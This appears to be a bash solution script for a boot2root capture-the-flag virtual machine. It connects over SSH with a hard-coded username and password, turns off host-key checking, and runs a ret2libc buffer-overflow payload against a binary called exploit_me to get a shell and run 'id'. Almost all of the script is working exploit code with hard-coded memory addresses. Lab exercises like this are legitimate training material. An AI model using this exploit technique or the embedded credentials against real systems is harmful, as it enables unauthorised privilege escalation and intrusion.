#!/bin/bash

USER="zaz"
PASS="646da671ca01bb5d84dbb5fb2238dc8e"
B2R_PORT=22

if [ -z ${B2R_HOST+x} ]; then read -p "VM Host: " B2R_HOST; fi

if dpkg -s sshpass >/dev/null 2>&1; then
    export SSHPASS=$PASS
    SSHP="sshpass -e"
fi

echo -e "$USER password is: $PASS\n"

(set -x
	$SSHP \
	ssh -q -o StrictHostKeyChecking=no $USER@$B2R_HOST -p $B2R_PORT 'bash -x' <<- EOI
		OFFSET=140
		SYSTEM_ADDR="\x60\xb0\xe6\xb7"
		SH_ADDR="\x58\xcc\xf8\xb7"
		python -c "print 'A' * \$OFFSET + '\$SYSTEM_ADDR' + 'A' * 4 + '\$SH_ADDR'" > /tmp/exploit

		./exploit_me \$(cat /tmp/exploit) <<< id
	EOI
)
